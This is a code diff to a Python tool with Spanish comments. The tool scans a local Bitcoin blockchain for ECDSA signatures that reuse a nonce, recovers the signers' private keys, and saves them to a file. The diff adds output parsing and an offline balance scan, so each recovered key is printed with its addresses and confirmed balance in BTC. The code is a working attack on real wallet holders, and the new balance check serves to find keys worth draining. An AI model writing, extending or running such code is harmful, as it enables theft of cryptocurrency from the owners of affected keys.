@@ -254,10 +254,14 @@ def parse_block(block: bytes) -> tuple[str | None, list[dict]]:
                 inputs.append({"prev_txid": prev_txid, "prev_vout": prev_vout, "scriptsig": script_sig})
 
             vout_n, pos = read_varint(block, pos)
+            outputs: list[dict] = []
             for _ in range(vout_n):
+                value = struct.unpack_from("<Q", block, pos)[0]
                 pos += 8
                 slen, pos = read_varint(block, pos)
+                script_pubkey = block[pos : pos + slen].hex()
                 pos += slen
+                outputs.append({"value": value, "scriptpubkey": script_pubkey})
 
             if segwit:
                 for _ in range(vin_n):
@@ -269,7 +273,7 @@ def parse_block(block: bytes) -> tuple[str | None, list[dict]]:
             pos += 4  # locktime
             tx_raw = block[tx_start:pos]
             txid = hashlib.sha256(hashlib.sha256(tx_raw).digest()).digest()[::-1].hex()
-            txs.append({"txid": txid, "inputs": inputs})
+            txs.append({"txid": txid, "inputs": inputs, "outputs": outputs})
 
         return block_hash, txs
     except Exception:
@@ -278,6 +282,17 @@ def parse_block(block: bytes) -> tuple[str | None, list[dict]]:
 
 def hash160(data: bytes) -> bytes:
     return hashlib.new("ripemd160", hashlib.sha256(data).digest()).digest()
+
+
+def extract_h160_from_scriptpubkey(script_hex: str) -> str | None:
+    """Soporta P2PKH y P2WPKH para estimar saldo de clave recuperada."""
+    # P2PKH: OP_DUP OP_HASH160 PUSH20 <h160> OP_EQUALVERIFY OP_CHECKSIG
+    if script_hex.startswith("76a914") and script_hex.endswith("88ac") and len(script_hex) == 50:
+        return script_hex[6:46]
+    # P2WPKH: OP_0 PUSH20 <h160>
+    if script_hex.startswith("0014") and len(script_hex) == 44:
+        return script_hex[4:44]
+    return None
 
 
 def private_key_to_addresses(priv_hex: str) -> tuple[str, str]:
@@ -303,6 +318,64 @@ def private_key_to_addresses(priv_hex: str) -> tuple[str, str]:
         return legacy, segwit
     except Exception as e:
         return f"ERROR:{e}", f"ERROR:{e}"
+
+
+def private_key_to_h160(priv_hex: str) -> str | None:
+    try:
+        raw = bytes.fromhex(priv_hex)
+        if len(raw) != 32:
+            return None
+        sk = SigningKey.from_string(raw, curve=SECP256k1)
+        vk = sk.verifying_key
+        x = vk.pubkey.point.x().to_bytes(32, "big")
+        y = vk.pubkey.point.y()
+        pub = (b"\x02" if (y % 2 == 0) else b"\x03") + x
+        return hash160(pub).hex()
+    except Exception:
+        return None
+
+
+def compute_confirmed_balance_sats(
+    blk_dir: Path,
+    xor_key: bytes,
+    target_h160: str,
+    max_blocks: int,
+) -> int:
+    """Calcula saldo confirmado (satoshis) para un h160 escaneando blockchain local."""
+    utxos: dict[tuple[str, int], int] = {}
+    processed = 0
+
+    for blk_file in get_blk_files(blk_dir):
+        for block in iter_blk_file(blk_file, xor_key):
+            if processed >= max_blocks:
+                break
+
+            _, txs = parse_block(block)
+            if not txs:
+                processed += 1
+                continue
+
+            for tx in txs:
+                txid = tx["txid"]
+
+                for inp in tx["inputs"]:
+                    prev_txid = inp.get("prev_txid")
+                    prev_vout = inp.get("prev_vout")
+                    key = (prev_txid, prev_vout)
+                    if key in utxos:
+                        del utxos[key]
+
+                for vout, out in enumerate(tx.get("outputs", [])):
+                    h160 = extract_h160_from_scriptpubkey(out.get("scriptpubkey", ""))
+                    if h160 == target_h160:
+                        utxos[(txid, vout)] = int(out.get("value", 0))
+
+            processed += 1
+
+        if processed >= max_blocks:
+            break
+
+    return sum(utxos.values())
 
 
 def recover_private_key(z1: int, z2: int, s1: int, s2: int, r: int) -> int | None:
@@ -358,6 +431,7 @@ def scan(blk_dir: Path, max_blocks: int) -> int:
     rel_count = 0
     and_count = 0
     keys_count = 0
+    balance_cache: dict[str, int] = {}
 
     xor_key = load_xor_key(blk_dir)
     skip = load_checkpoint()
@@ -413,6 +487,31 @@ def scan(blk_dir: Path, max_blocks: int) -> int:
                                 if priv:
                                     keys_count += 1
                                     legacy, segwit = private_key_to_addresses(priv_hex)
+                                    h160_hex = private_key_to_h160(priv_hex)
+                                    if h160_hex:
+                                        if h160_hex not in balance_cache:
+                                            print("  -> calculando saldo confirmado offline...")
+                                            balance_cache[h160_hex] = compute_confirmed_balance_sats(
+                                                blk_dir=blk_dir,
+                                                xor_key=xor_key,
+                                                target_h160=h160_hex,
+                                                max_blocks=max_blocks,
+                                            )
+                                        balance_sats = balance_cache[h160_hex]
+                                        balance_btc = balance_sats / 100_000_000
+                                        print(
+                                            f"  ✓ clave recuperada: {priv_hex}\n"
+                                            f"    legacy: {legacy}\n"
+                                            f"    segwit: {segwit}\n"
+                                            f"    saldo confirmado: {balance_sats} sats ({balance_btc:.8f} BTC)"
+                                        )
+                                    else:
+                                        print(
+                                            f"  ✓ clave recuperada: {priv_hex}\n"
+                                            f"    legacy: {legacy}\n"
+                                            f"    segwit: {segwit}\n"
+                                            "    saldo confirmado: no disponible"
+                                        )
                                     with Path(KEYS_FILE).open("a", encoding="utf-8") as f:
                                         f.write(
                                             f"{priv_hex}\t{legacy}\t{segwit}\t{r_hex}\t{prev['txid']}\t{txid}\n"
